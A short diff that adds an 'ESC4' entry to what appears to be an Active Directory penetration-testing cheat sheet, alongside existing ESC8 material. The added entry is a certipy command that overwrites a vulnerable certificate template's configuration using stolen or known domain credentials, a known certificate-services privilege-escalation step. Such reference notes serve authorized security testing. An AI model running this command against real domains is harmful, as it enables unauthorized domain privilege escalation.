@@ -831,6 +831,14 @@ u.objectid ENDS WITH "-548" RETURN q
 </details> 
 
 <details>
+  <summary> ESC4 </summary> 
+
+  ```shell
+  certipy template -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -target <target_server> -template <vulnerable_template> -write-default-configuration
+  ```
+</details> 
+
+<details>
   <summary> ESC8 </summary> 
   
   ### http
